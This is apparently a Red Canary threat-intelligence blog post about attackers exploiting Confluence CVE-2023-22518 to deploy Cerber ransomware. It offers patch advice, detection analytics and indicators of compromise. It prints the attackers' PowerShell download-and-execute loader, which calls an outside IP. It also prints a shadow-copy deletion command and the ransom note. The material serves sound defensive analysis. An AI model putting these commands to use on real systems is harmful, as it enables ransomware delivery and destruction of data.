["https://redcanary.com/blog/threat-intelligence/confluence-exploit-ransomware"]
title = "Adversaries exploit Confluence vulnerability to deploy ransomware"
description = "Red Canary has detected apparent exploitation of Atlassian Confluence CVE-2023-22518 in an attempted Cerber ransomware campaign."
full_description = '''On November 5, 2023, Red Canary detected suspected exploitation of Atlassian Confluence CVE-2023-22518 that led to an attempt to deploy Cerber ransomware. The activity we observed is similar to intrusions previously reported by The DFIR Report and Rapid7. We’ve decided to publish our own observations and detection guidance to help the community better defend against this threat.CVE-2023-22518 is an improper authorization vulnerability within Confluence Data Center and Confluence Server that allows unauthenticated users to perform a “restore from backup” by submitting their own arbitrary .zip file. Adversaries can exploit the vulnerability to destroy Confluence instances, leading to data loss. Alternatively, adversaries may also submit a .zip file containing a web shell to achieve remote code execution (RCE) on vulnerable, on-premise Confluence servers.Red Canary recommends following Atlassian’s guidance to update on-premise instances of Confluence to one of the listed versions:7.19.16 or later8.3.4 or later8.4.4 or later8.5.3 or later8.6.1 or laterObserved behaviorsIf successfully exploited, CVE-2023-22518 could enable an adversary to upload arbitrary content to Confluence instances without authentication using a “restore from backup archive” function. Atlassian stated in its security advisory that there is “…no impact to confidentiality as an attacker cannot exfiltrate any instance data.” However, an adversary that uploads a specially crafted .zip archive file may be able to upload a web shell that could allow for arbitrary remote code execution on the system in addition to wiping data from a Confluence instance (as Atlassian initially reported).After gaining initial access, the adversary ran the reconnaissance command: cmd /c whoami. The adversary then executed encoded PowerShell commands, which you can see decoded below:IEX((New-Object Net.WebClient).DownloadString("http://193.176.179[.]41/tmp.48")) <link media='all' rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/styles/default.min.css"> hljs.highlightAll();The contents of the downloaded tmp.48 file are shown below:function Download_Execute { [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $True)] [String] $URL ) $webclient = New-Object System.Net.WebClient $webclient.Headers.Add("User-Agent","Mozilla/4.0+") $webclient.Proxy = [System.Net.WebRequest]::DefaultWebProxy $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials $ProxyAuth = $webclient.Proxy.IsBypassed($URL) if($ProxyAuth) { [string]$hexformat = $webClient.DownloadString($URL) } else { $webClient = New-Object -ComObject InternetExplorer.Application $webClient.Visible = $false $webClient.Navigate($URL) while($webClient.ReadyState -ne 4) { Start-Sleep -Milliseconds 100 } [string]$hexformat = $webClient.Document.Body.innerText $webClient.Quit() } [Byte[]] $temp = $hexformat -split ' ' [System.IO.File]::WriteAllBytes("$env:temp\svcPrvinit.exe", $temp) $args = "-b 9" Start-Process -FilePath "$env:temp\svcPrvinit.exe" -WindowStyle Hidden -ArgumentList $args } Download_Execute http://193.176.179[.]41/tmp.48.txt <link media='all' rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/styles/default.min.css"> hljs.highlightAll();The script performs multiple actions:The script defines a function named Download_Execute that initializes a .NET WebClient object that sets the HTTP User-Agent string to mimic Mozilla 4.0 and configures proxy settings.The script checks to see whether the specified proxy server should be used by the Confluence server. If so, the script will use that web client to download the specified file. If not, the script uses an Internet Explorer Component Object Model (COM) object to download the script.The script downloads a Cerber ransomware executable, saves it to the Temp folder under the name svcprvinit.exe, and runs the process with the command-line arguments -b 9 without displaying a window.The last line of the file calls the Download_Execute function, specifying it to reach out to the IP address 193.176.179[.]41 and download tmp.48.txt and extract the Cerber ransomware file from it.tmp.48.txt was saved on disk at the path C:\Windows\Temp\svcprvinit.exe. It’s worth noting that the first submission of the ransomware binary on VirusTotal was on November 1, suggesting that exploitation may have begun within 24 hours of initial disclosure of the CVE, which Atlassian released publicly on October 31. This is in line with what Red Canary has repeatedly observed in the past—namely, widespread exploitation attempts mere days after a public disclosure of critical security vulnerabilities.Ransomware analysisRed Canary was able to obtain and analyze svcprvinit.exe, which is a Cerber ransomware sample that we assess was likely derived from materials exposed in the Conti ransomware leaks. Upon execution, the binary encrypts files on local disks and in network shares, appends the .LOCK3D file extension, creates a mutex in memory, deletes volume shadow copies, drops ransom notes, and deletes itself.The ransomware binary uses ChaCha (a modification of the Salsa20 stream cipher) to encrypt files. This is consistent with the last known build of Conti using ChaCha for file encryption. The binary also contains the capability to use AES and RC4 for different encryption operations (e.g., encrypting keys).The ransomware binary creates the mutex hsfjuukjzloqu28oajh727190 to ensure that only one instance of the malware is running at a time. Security researchers have discovered that this particular mutex has been shared across Conti samples and additional ransomware families, allegedly derived from leaked Conti material. The binary supports encrypting multiple file types on local drives as well as remote file shares.The ransomware drops the following ransom note, named read-me3.txt, in each encrypted folder:C3RB3R INSTRUCTIONS ************************************************************************* IMPORTANT : DO NOT DELETE THIS FILE UNTIL ALL YOUR DATA HAVE BEEN RECOVERED!!! All your important files have been encrypted. Any attempts to restore your files with thrid-party software will be fatal for your files! The only way to decrypt your files safely is to buy the special decryption software "C3rb3r Decryptor". We have also downloaded a lot of data from your system. If you do not pay, we will sell your data on the dark web. You should get more information on our page, which is located in a Tor hidden network. 1.Download Tor browser - https://www.torproject.org/ 2.Install and run Tor browser 3.Connect with the button "Connect" 4.Open link in Tor browser : http://j3qxmk6g5sk3zw62i2yhjnwmhm55rfz47fdyfkhaithlpelfjdokdxad.onion/<unique path> 5.The site should be loaded. if for some reason the site is not loading wait for a moment and try again 6.Follow the instructions on this page You can proceed with purchasing of the decryption software at your personal page: ************************************************************************* http://j3qxmk6g5sk3zw62i2yhjnwmhm55rfz47fdyfkhaithlpelfjdokdxad.onion/<unique path> At this page you will receive the complete instructions how to buy the decryption software for restoring all your files. Also at this page you will be able to restore any one file for free to be sure "C3rb3r Decryptor" will help you. ATTENTION: 1.Do not try to recover files yourself, this process can damage your data and recovery will become impossible. 2.Do not waste time trying to find the solution on the internet. The longer you wait, the higher will become the decryption software price. 3.Tor Browser may be blocked in your country or corporate network. Use Tor Browser over VPN. <link media='all' rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/styles/default.min.css"> hljs.highlightAll();The ransomware then uses cmd.exe and wmic.exe to delete volume shadow copies with the following command:cmd.exe /c C:\Windows\System32\wbem\WMIC.exe shadowcopy where "ID='<VSS ID>'" delete <link media='all' rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/styles/default.min.css"> hljs.highlightAll();Finally, the ransomware deletes itself:"C:\Windows\system32\cmd.exe" /c del c:\windows\temp\svcprvinit.exe >> NUL <link media='all' rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/styles/default.min.css"> hljs.highlightAll();Identifying on-premise Confluence installationsCVE-2023-22518 only affects vulnerable on-premise instances of Confluence. This detection opportunity identifies potential instances of on-premise Confluence, but we’d like to emphasize that this detection only helps identify in EDR data whether or not you have a Confluence server in your organization. This query does not show signs of malicious activity. parent_process == (java || tomcat)&&command_includes == (confluence) Detection opportunitiesThe following are pseudo-detection analytics that are intended as a starting point for detecting relevant malicious or suspicious activity. They may require tuning depending on false positive levels and what constitutes normal behavior in your environment.Detection opportunity: Tomcat spawning Windows Command Shell or PowerShell and performing reconnaissanceThis pseudo-detector looks for endpoint activity you’re likely to see resulting from the specific exploitation of CVE-2023-22518 described in this article. It should unearth instances of Tomcat spawning either PowerShell or the Windows Command Shell and running reconnaissance commands. parent_process == (tomcat)&&process == (cmd || powershell)&&child_process == (whoami.exe || nltest.exe) Detection opportunity: PowerShell invoke expression and DownloadString to download remotely hosted filesThis pseudo-detector identifies instances of PowerShell leveraging iex(New-Object Net.WebClient).DownloadString to download remotely hosted files. process == (powershell.exe)&&command_includes == (IEX((New-Object Net.WebClient).DownloadString)) Detection opportunity: Encoded PowerShell commandsThis detection analytic looks for abuse of the shortened encoded PowerShell command switch. This activity is often used by adversaries to obfuscate the use of malicious code on an endpoint. You may be able to refine the accuracy of this detector by looking for the execution of encoded PowerShell commands in conjunction with external network connections and the creation of executable files on disk.Note: We also recommend checking out Red Canary’s Threat Detection Report section on PowerShell. The page contains additional PowerShell detection analytics that can be applied for protection against this and other threats. process == (powershell.exe)&&command_includes == “(-e || -en || -enc || -enco || [any variation of the encoded command switch]*) *Note: Any variation of the encoded command switch from -e to -encodedcommand will encode PowerShell commands. Detection opportunity: PowerShell or Windows Command Shell bypassing execution policiesThis detection analytic identifies adversaries leveraging PowerShell or the Windows Command Shell in an attempt to bypass execution policies by running commands with the -exec switch and the bypass flag, which are commonly used by adversaries to subvert security measures like antivirus. process == (powershell.exe || cmd.exe)&&command_includes == (-exec && bypass) IOCsIOCTYPENOTEIOC:193.176.179[.]41TYPE:IPNOTE:IP address that hosted malicious tmp.48 and tmp.48.txt scriptsIOC:ea00b0ca0f40ce307c24a03ec1a19a066a758e2ea0f433c3b199ee28b07961e0TYPE:SHA-256NOTE:SHA256 of tmp.48IOC:685f0cac24dd3c8b7eb40eaf32b693d915aac3fd21912ddd60ba7c12c5583791TYPE:SHA-256NOTE:SHA256 of tmp.48.txtIOC:f2e17ec85c3f8ee26a3be3ce52c6e140448941d705a9bdedb7c1aa82a9d9707fTYPE:SHA-256NOTE:SHA256 of svcprvinit.exe (Cerber ransomware)IOC:hsfjuukjzloqu28oajh727190TYPE:MutexNOTE:Mutex of svcprvinit.exe (Cerber ransomware)IOC:C:\Windows\Temp\svcprvinit.exeTYPE:File PathNOTE:File path of svcprvinit.exe (Cerber ransomware)ConclusionOrganizations running vulnerable, on-premise Confluence installations should consider updating those systems as soon as possible. In the meantime, the information in this article should help security teams identify whether they’re running Confluence on-premise and detect suspicious activity accordingly.Related Articles Intelligence Insights: January 2025 Threat intelligenceIntelligence Insights: January 2025 Tangerine Turkey mines cryptocurrency in global campaign Threat intelligenceTangerine Turkey mines cryptocurrency in global campaign Intelligence Insights: December 2024 Threat intelligenceIntelligence Insights: December 2024 Storm-1811 exploits RMM tools to drop Black Basta ransomware Threat intelligenceStorm-1811 exploits RMM tools to drop Black Basta ransomware Subscribe to our blog MktoForms2.loadForm("//resource.redcanary.com", "003-YRU-314", 1034);'''
